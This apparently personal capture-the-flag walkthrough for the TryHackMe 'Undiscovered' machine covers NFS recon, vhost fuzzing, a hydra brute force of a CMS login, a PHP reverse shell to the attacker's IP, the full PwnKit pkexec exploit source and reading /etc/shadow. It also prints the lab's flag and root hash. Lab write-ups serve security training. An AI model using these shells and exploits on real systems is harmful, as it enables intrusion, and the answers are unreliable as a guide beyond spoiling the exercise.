@@ -1,0 +1,431 @@
+UNDISCOVERED.
+
+
+
+
+[>>> PREPARATION]
+[ACTION: add undiscovered.thm to hosts]
+sudo nano /etc/hosts
+Add line: 10.10.19.238 undiscovered.thm
+
+
+
+
+[>>> ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.19.238
+[OUTPUT]
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http     Apache httpd 2.4.18
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+2049/tcp  open  nfs      2-4 (RPC #100003)
+36194/tcp open  nlockmgr 1-4 (RPC #100021)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[NOTE]
+rpcbind is a directory service for rpc (remote procedure call).
+Before client can use service like nfs, it contacts rpcbind first to ask the port nfs is listening on.
+nfs allows mounting remote file systems over the network.
+nlockmgr is hands file locking over nfs.
+
+
+
+
+[>>> RECON: TESTING RPCBIND]
+[ACTION: run rpcinfo]
+rpcinfo -p 10.10.19.238
+[OUTPUT]
+  program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    2   tcp   2049  nfs_acl
+    100227    3   tcp   2049  nfs_acl
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100227    2   udp   2049  nfs_acl
+    100227    3   udp   2049  nfs_acl
+    100021    1   udp  50412  nlockmgr
+    100021    3   udp  50412  nlockmgr
+    100021    4   udp  50412  nlockmgr
+    100021    1   tcp  36194  nlockmgr
+    100021    3   tcp  36194  nlockmgr
+    100021    4   tcp  36194  nlockmgr
+
+
+
+
+[>>> RECON: TESTING NFS]
+[ACTION: list available nfs shares]
+showmount -e 10.10.19.238
+[OUTPUT]
+clnt_create: RPC: Program not registered
+
+
+[ACTION: attempt mounting root directory of nfs export of host]
+sudo mount -t nfs -o vers=4 10.10.19.238:/ /mnt/test
+[NOTE]
+We get /mnt/test/home/william
+However, we lack permissions to explore /william.
+
+
+[ACTION: check permissions on william]
+ls -ln /mnt/test/home
+[OUTPUT]
+drwxr-x--- 4 65534 65534 4096 Sep  9  2020 william
+[NOTE]
+The folder is owned by user and group 65534.
+Researching, I find out uid 65534 is mapped to user nobody.
+We can't view it since we aren't nobody (we are others, which have permissions ---).
+
+
+[ACTION: create user with required uid]
+sudo useradd -u 65534 undiscovered_nobody
+[OUTPUT]
+useradd: UID 65534 is not unique
+[NOTE]
+I forgot nobody already exists in our local machine, which can be verified by running getent passwd 65534.
+
+
+[ACTION: switch to user nobody]
+sudo su -s /bin/bash nobody
+[OUTPUT]
+nobody@kali:/mnt/test/home$ 
+
+
+[ACTION: move into william]
+cd william
+[OUTPUT]
+bash: cd: william/: Permission denied
+[NOTE]
+Even though we match uid and gid, we still can't get into william directory.
+
+
+
+
+[>>> RECON: EXPLORING http://undiscovered.thm/]
+We land on a site with no redirect buttons.
+Also, there is no clue in clear text, neither in the source.
+Other than: "The path should be the darker one".
+
+
+
+
+[>>> ENUMERATION: DIRECTORIES]
+[ACTION: gobuster scan for common directories]
+gobuster dir -u http://undiscovered.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[NOTE]
+No useful output.
+
+
+[ACTION: gobuster directory scan, medium list]
+gobuster dir -u http://undiscovered.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+[NOTE]
+No useful output.
+
+
+
+
+[NOTE]
+Since it looks like we have reached a dead end, our best bet is attempting to bruteforce the ssh login for our found user (william).
+[>>> ATTACK: BRUTEFORCE SSH WILLIAM LOGIN]
+[ACTION: hydra bruteforce]
+hydra -l william -P ~/thm/rockyou.txt 10.10.19.238 ssh
+[NOTE]
+Hydra was taking way too long.
+I assume we are missing the easy path.
+
+
+
+
+[>>> RECON: TESTING NFS SHARES (2)]
+[NOTE]
+Previously, we used version 4.
+[ACTION: mount via nsf version 3]
+sudo mkdir /mnt/test2
+sudo mount -t nfs -o vers=3 10.10.19.238:/ /mnt/test
+[OUTPUT]
+Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
+mount.nfs: requested NFS version or transport protocol is not supported for /mnt/test2
+
+
+
+
+[NOTE]
+A web server can host multiple websites (virtual hosts). 
+We will attempt to fuzz the http host headers to try find other hosted domains on our target ip.
+[>>> ENUMERATION: VIRTUAL HOSTS]
+[ACTION: enumerate domains via ffuf]
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    -H "Host: FUZZ.undiscovered.thm" \
+    -u http://undiscovered.thm/ \
+    -mc 200 \
+    -s
+[OUTPUT]
+manager
+dashboard
+deliver
+newsite
+develop
+network
+maintenance
+forms
+view
+mailgate
+play
+start
+booking
+terminal
+gold
+internet
+resources
+
+
+[ACTION: update hosts]
+Add line: 10.10.19.238 manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm network.undiscovered.thm maintenance.undiscovered.thm forms.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm
+
+
+
+
+[>>> RECON: explore new domains]
+[ACTION: explore http://manager.undiscovered.thm/]
+I land on a site running ritecms v2.2.1 (version found in source code).
+The buttons redirect to not found errors.
+
+
+[ACTION: research exploits for manager]
+Found https://www.exploit-db.com/exploits/48636.
+Requires previous authentication via /cms.
+
+
+[ACTION: explore http://dashboard.undiscovered.thm]
+Same site as manager.
+Also doesn't have /cms.
+
+
+[ACTION: explore http://deliver.undiscovered.thm]
+Theme colour is darker.
+Also, /cms is available.
+We can try bruteforce the login for admin.
+
+
+[NOTE]
+Parameter names: username, userpw
+Error message: User unknown or password wrong
+[ACTION: attempt bruteforce admin login to deliver]
+sudo hydra -l admin -P ~/thm/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/:username=^USER^&userpw=^PASS^:User unknown or password wrong"
+[OUTPUT]
+[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
+[NOTE]
+Thankfully, it looks like we don't need to go through every subdomain.
+However, I had a ffuf command prepared to do subdomain and directory enumeration in mass.
+Ffuff (unused but useful) command:
+ffuf -w subs.txt:SUB -w /usr/share/seclists/Discovery/Web-Content/common.txt:DIR \
+    -u http://SUB.undiscovered.thm/DIR \
+    -mc 200,301,302 \
+    -t 50 \
+    -v
+
+
+
+
+[>>> INITIAL ACCESS]
+[NOTE]
+Creds: admin|liverpool
+[ACTION: log in as admin to http://deliver.undiscovered.thm/cms/]
+
+
+[ACTION: reread exploit (https://www.exploit-db.com/exploits/48636)]
+Based on the instructions, once logged in as admin, we need to:
+1. Go to http://deliver.undiscovered.thm/cms/.
+2. Click File Manager.
+3. Upload our php webshell.
+4. Visit http://deliver.undiscovered.thm/media/SHELL_NAME.php to trigger shell.
+5. Execute commands as follows: http://deliver.undiscovered.thm/media/SHELL_NAME.php?cmd=COMMAND
+[NOTE]
+Instead of running commands manually via url, i'll upload a php script to spawn a rev shell.
+
+
+[ACTION: start listener]
+nc -lnvp 4444
+
+
+[ACTION: prepare shell]
+echo 'bash -i >& /dev/tcp/10.23.25.109/4444 0>&1' > undiscovered_shell.php
+
+[ACTION: trigger shell]
+Upload shell to File Manager.
+Run locally: http://deliver.undiscovered.thm/media/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyour_ip%2F4444%200%3E%261
+[NOTE]
+I caught no shell.
+It probably has to do with the shell being too bare bones.
+
+
+[ACTION: exploit (2)]
+1. Create shell:
+nano rev.php
+Content:
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.23.25.109/4444 0>&1'");
+?>
+2. Upload to file manager.
+3. Trigger shell, visit: http://deliver.undiscovered.thm/media/rev.php
+[OUTPUT]
+www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$ 
+
+
+[ACTION: stabilize shell]
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+stty raw -echo; fg
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[NOTE]
+We get no output.
+
+
+[ACTION: list users (home directories)]
+ls /home
+[OUTPUT]
+leonard  william
+[NOTE]
+The flag is inside one of these directories.
+None we can access right now.
+
+
+
+
+[>>> PRIVESC: TO USER]
+[ACTION: list suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/bin/ping6
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/bin/mount
+/sbin/mount.nfs
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+
+[ACTION: check fusermount version]
+fusermount --version
+[OUTPUT]
+2.9.4
+[NOTE]
+v.9.4 is in range (2.9.3-2.9.15) for https://www.exploit-db.com/exploits/37089.
+However, that exploit requires root to open a bash.
+
+
+[ACTION: check pkexec version]
+pkexec --version
+[OUTPUT]
+pkexec version 0.105
+[NOTE]
+We can test https://www.exploit-db.com/exploits/50689.
+
+
+[ACTION: create evil-so.c]
+cd /tmp
+cat << 'EOF' > evil-so.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+    execve("/bin/sh", NULL, NULL);
+}
+EOF
+
+
+[ACTION: create exploit.c]
+cat << 'EOF' > exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BIN "/usr/bin/pkexec"
+#define DIR "evildir"
+#define EVILSO "evil"
+
+int main()
+{
+    char *envp[] = {
+        DIR,
+        "PATH=GCONV_PATH=.",
+        "SHELL=ryaagard",
+        "CHARSET=ryaagard",
+        NULL
+    };
+    char *argv[] = { NULL };
+
+    system("mkdir GCONV_PATH=.");
+    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
+    system("mkdir " DIR);
+    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
+    system("cp " EVILSO ".so " DIR);
+
+    execve(BIN, argv, envp);
+
+    return 0;
+}
+EOF
+
+
+[ACTION: exploit]
+gcc exploit.c -o exploit
+./exploit
+[OUTPUT]
+#
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/william/user.txt
+
+
+[ACTION: read user flag]
+cat /home/william/user.txt
+[OUTPUT]
+THM{8d7b7299cccd1796a61915901d0e091c}
+
+
+[ACTION: get root user password hash]
+grep '^root:' /etc/shadow
+[OUTPUT]
+root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
+[NOTE]
+Actual answer (just the hash part):
+$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0
+
